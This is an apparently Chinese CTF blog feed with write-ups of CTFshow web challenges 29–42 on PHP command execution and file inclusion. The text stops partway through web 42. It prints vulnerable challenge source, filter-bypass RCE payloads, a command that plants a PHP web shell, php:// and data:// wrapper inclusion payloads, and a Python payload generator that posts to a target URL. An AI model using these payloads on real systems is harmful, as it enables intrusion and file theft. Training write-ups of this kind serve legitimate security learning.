class="hljs-string">&quot;TXW4EVER&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&#x27;abc&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$value</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-string">&quot;sixsixsix&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;a);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><br></code></pre></td></tr></table></figure><h2 id="一、理清pop链并进行标注"><a href="#一、理清pop链并进行标注" class="headerlink" title="一、理清pop链并进行标注"></a>一、理清pop链并进行标注</h2><h1 id="Smarty模板注入"><a href="#Smarty模板注入" class="headerlink" title="Smarty模板注入"></a>Smarty模板注入</h1><p><a href="https://xz.aliyun.com/t/12220?time__1311=GqGxRDcGD=G==GN4eeqBK0Qnx+n03Kqa4D">https://xz.aliyun.com/t/12220?time__1311=GqGxRDcGD%3DG%3D%3DGN4eeqBK0Qnx%2Bn03Kqa4D</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow web入门</title>
    <link href="/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/"/>
    <url>/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-web入门"><a href="#CTFshow-web入门" class="headerlink" title="CTFshow web入门"></a>CTFshow web入门</h1><p><img src="/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/1.jpg" alt="图片"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h4><p>只要提交的参数值不出现 flag 就行</p><p>先看当前目录的文件，可以看到 flag 就在当前目录下，叫 flag.php</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>构造 payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);   <br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla?.php&#x27;</span>);使用 ? 进行匹配<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla\g.php&#x27;</span>);  转义绕过<br><br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls -ld&#x27;</span>);看当前目录的权限<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;echo \&#x27;&lt;?php @eval($_REQUEST[&quot;cmd&quot;]); ?&gt;\&#x27; &gt; eval.php&#x27;</span>);看一下 <span class="hljs-keyword">eval</span>.php内容 <br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat eval.php&#x27;</span>); <br>/<span class="hljs-keyword">eval</span>.php?cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);调用 这里直接调用我们自己写的木马就不用担心过滤的问题了 或者直接连接一剑<br><br><br><br>?c=echo <span class="hljs-string">`nl fl&#x27;&#x27;ag.php`</span>;在 Shell 脚本或命令行中，反引号<span class="hljs-string">` `</span> 和 $() 用于执行命令并获取其输出。nl: 这个命令会给输入的文本添加行号。它常用于格式化文本，以便于阅读和调试<br></code></pre></td></tr></table></figure><h4 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h4><p>echo大法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">ls</span>`;<br><br>/?c=passthru(<span class="hljs-string">&quot;cat f*&quot;</span>);<br>/?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.p<span class="hljs-string">&#x27;&#x27;</span>hp`;<br>/?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> f*lag.p*hp`;<br>?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> f*`;<br></code></pre></td></tr></table></figure><h4 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 被过滤的解决方案：<br>more：一页一页的显示档案内容<br>less：与 more 类似<br><span class="hljs-built_in">head</span>：查看头几行<br><span class="hljs-built_in">tac</span>：从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>：查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>：以二进制的方式读取档案内容<br>vi：一种编辑器，这个也可以查看<br>vim：一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>：可以查看<br><span class="hljs-built_in">uniq</span>：可以查看<br>file -f：报错出具体内容<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">经典逃逸 ?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);类似弄了个一句话木马 ，并且参数 <span class="hljs-number">1</span> 后面的内容不受正则匹配的影响。<br><br>    <span class="hljs-keyword">echo</span>大法       ?c=<span class="hljs-keyword">echo</span>`nl%<span class="hljs-number">09</span>fla*`;<br>              ?c=<span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`tac%<span class="hljs-number">09</span>f*`;<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>scandir(pos(localeconv())): 这个函数调用 scandir() 用于扫描目录，pos(localeconv()) 返回当前本地化设置的符号。这段代码的目的是扫描某个目录下的文件和目录。</p><p>array_reverse(): 这个函数用于将数组中的元素倒序排列。在这里它被应用在 scandir() 的返回值上，意味着文件和目录列表将会以相反的顺序返回。</p><p>next(): 这个函数用于将数组的内部指针向前移动并返回当前元素的值。在这里它似乎是用于获取数组的下一个元素。</p><p>show_source(): 这个函数用于输出文件的源代码。这个代码的意图似乎是扫描某个目录下的文件和目录，然后将它们倒序排列，并尝试显示它们中的下一个文件的源代码。</p><h4 id="web-32"><a href="#web-32" class="headerlink" title="web 32"></a>web 32</h4><p>源码过滤了分号，echo，反引号，单引号，括号，分号。但没有过滤双引号。</p><p>方法1</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br> <span class="hljs-string">?&gt;</span> 是 <span class="hljs-variable constant_">PHP</span> 代码的结束标记，指示 <span class="hljs-variable constant_">PHP</span> 代码的结束，从这里开始的内容将被视为普通的 <span class="hljs-variable constant_">HTML</span> 或文本。<br>这里，也可以用<span class="hljs-variable">$_POST</span>，那么后续传参就通过post传参。<br> <span class="hljs-string">?c</span>=<span class="hljs-variable">$nice</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-string">?&gt;</span>&amp;url=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-<br>encode/resource=flag.php<br><br></code></pre></td></tr></table></figure><h4 id="web-33-34-35-36"><a href="#web-33-34-35-36" class="headerlink" title="web 33 34 35 36"></a>web 33 34 35 36</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url + <span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br><br></code></pre></td></tr></table></figure><h4 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123; <span class="hljs-comment">//过滤但有include</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br>与之前基于<span class="hljs-keyword">eval</span>的命令执行不同，这里是<span class="hljs-keyword">include</span>，要传入一个文件名<br></code></pre></td></tr></table></figure><p>data协议</p><p>data协议是一种允许你在URL中嵌入数据的协议</p><p>&#x2F;?c&#x3D;data:text&#x2F;plain,<?php system("ls");?> </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">先对 </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 进行 base64 编码</span><br><span class="language-xml">再利用伪协议传输，c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="web-38"><a href="#web-38" class="headerlink" title="web 38"></a>web 38</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br>不能是flag，php，file这些字符串并且不分大小写<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">pay1</span><br><span class="language-xml">php 代码这里可以使用 php 短标签进行绕过，flag.php 可继续用通配符 ? 绕过</span><br><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fla?.???&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">pay2</span><br><span class="language-xml">c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h4><p> 会在后面拼接一个 .php，但是过滤了 flag</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">闭合 include 函数，让拼接不执行。</span><br><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml">)?&gt;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"> </span><br><span class="language-php"> 其实不用做其他处理，直接用通配符代替传参即可。</span><br><span class="language-php"> ?c=data:<span class="hljs-comment">//text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_69289738/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">132689462</span><br></code></pre></td></tr></table></figure><p>get_defined_vars()返回的是一个多维数组，我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 函数用于打印变量，以更容易理解的形式展示<br><br><br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)<br><br><br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>：返回数组中的当前元素的值。<br>这里也可以换成<span class="hljs-built_in">current</span>()，作用和pos类似<br><br><br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>：数组逆序<br><br><br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>：获取目录下的文件<br><br><br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>： 函数将内部指针指向数组中的下一个元素，并输出。<br><br><br>通过 <span class="hljs-built_in">pos</span>(<span class="hljs-built_in">localeconv</span>())得到点号<br>因为<span class="hljs-built_in">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>)表示得到当前目录下的文件<br>PS：如果我没有记错，<span class="hljs-built_in">scnadir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)也能扫描当前目录下面的文件，但是这道题貌似无法使用<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)和<span class="hljs-built_in">chr</span>(<span class="hljs-number">48</span>)（.和/的ASCII码）进行过<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure><ol><li><code>localeconv()</code> 返回一个包含当前区域设置的数组。</li><li><code>current()</code> 获取该数组的第一个元素。</li><li><code>scandir()</code> 列出该元素指定的目录中的所有文件和子目录。</li><li><code>array_reverse()</code> 反转 <code>scandir()</code> 的结果。</li><li><code>next()</code> 移动内部指针并获取下一个文件或目录。</li><li><code>show_source()</code> 显示获取到的文件或目录的源代码。</li></ol><h4 id="web-41"><a href="#web-41" class="headerlink" title="web 41"></a>web 41</h4><p>无数字无字母，直接套用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_true</span>(<span class="hljs-params">reg, asc: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> reg.<span class="hljs-keyword">match</span>(<span class="hljs-built_in">chr</span>(asc)) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_url_code</span>(<span class="hljs-params">asc: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;asc:02x&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">char_or_dict</span>(<span class="hljs-params">reg</span>) -&gt; <span class="hljs-built_in">dict</span>:<br>    dic = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">if</span> is_true(reg, i) <span class="hljs-keyword">and</span> is_true(reg, j):<br>                char = <span class="hljs-built_in">chr</span>(i | j)<br>                <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> dic <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(char) &gt; <span class="hljs-number">126</span>:<br>                    <span class="hljs-keyword">continue</span><br>                dic[char] = [to_url_code(i), to_url_code(j)]<br>    <span class="hljs-keyword">return</span> dic<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_char_or</span>(<span class="hljs-params">char: <span class="hljs-built_in">str</span>, dic: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    s1 = <span class="hljs-string">&#x27;&#x27;</span>.join(dic[i][<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char)<br>    s2 = <span class="hljs-string">&#x27;&#x27;</span>.join(dic[i][<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;(&quot;<span class="hljs-subst">&#123;s1&#125;</span>&quot;|&quot;<span class="hljs-subst">&#123;s2&#125;</span>&quot;)&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Url: &quot;</span>)<br>    reg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&quot;</span>, re.I)<br>    char_ordic = char_or_dict(reg)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        param = get_char_or(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;your function: &quot;</span>), char_ordic) + get_char_or(<br>            <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;your command: &quot;</span>), char_ordic<br>        )<br>        <span class="hljs-built_in">print</span>(param)<br>        <span class="hljs-built_in">print</span>(urllib.parse.unquote(param))<br>        data = &#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)&#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] result:\n<span class="hljs-subst">&#123;r.text&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h4 id="web-42"><a href="#web-42" class="headerlink" title="web 42"></a>web 42</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>分析：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>将 get 请求传递的 c 的内容与后面内容进行拼接后作为 system 函数的参数；</p><blockquote><p>&#x2F;dev&#x2F;null 是一个重定向操作符，用于将标准输出（stdout）重定向到 &#x2F;dev&#x2F;null，这意味着命令的标准输出将不会显示在终端或网页上，也不会写入任何文件；</p></blockquote><p>2&gt;&amp;1 是另一个重定向操作符，它将标准错误（stderr）重定向到标准输出（stdout），&gt;&amp;1 表示将标准错误重定向到标准输出所指向的地方（即 &#x2F;dev&#x2F;null），这意味着命令的所有错误信息也会被丢弃。<br>方法：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">（<span class="hljs-number">1</span>）使用分号 <span class="hljs-comment">;     ?c=ls; 命令分隔，分号只适用于 Linux 系统，不适用于 Windows 系统。</span><br>（<span 